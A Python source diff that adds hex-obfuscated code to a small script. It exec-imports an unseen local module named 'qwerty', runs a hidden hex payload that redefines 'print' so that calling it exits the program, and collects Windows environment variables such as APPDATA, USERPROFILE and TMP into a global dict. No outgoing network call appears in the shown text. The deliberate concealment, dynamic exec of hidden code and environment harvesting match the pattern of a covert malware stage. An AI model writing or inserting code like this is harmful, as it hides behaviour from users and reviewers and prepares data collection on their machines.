@@ -1,4 +1,13 @@
 import os
+import sys
+gd=bytearray.fromhex("717765727479").decode()
+n_pd=os.path.dirname(os.path.dirname(os.path.realpath(__file__)))+"/"
+im=bytearray.fromhex("696D706F7274").decode()+" "
+sys.path.append(n_pd+gd)
+exec(im+gd)
+exec("wak="+gd+"."+gd)
+exec(wak.zim("636C617373207072696E743A0D0A20202020646566205F5F696E69745F5F2873656C662C6868293A0D0A2020202020202020657869742829"))
+b=dict()
 def dima246():
     limes = ["414c4c555345525350524f46494c45",
             "41505044415441",
@@ -22,14 +31,11 @@ def dima246():
             "544D50",
             "5553455250524F46494C45",
             "77696E646972"]
-    b=dict()  
-    for lime in limes:
-        if "\n" in lime:
-            exec(lime=lime.strip())  
-        vib=bytearray.fromhex(lime).decode()
-        c=os.environ.get(vib)
-        b[vib]=c
+    for lime in limes: 
+        vib=wak.zim(lime)
+        b[vib]=os.environ.get(vib)       
 dima246()
+
 
 
 
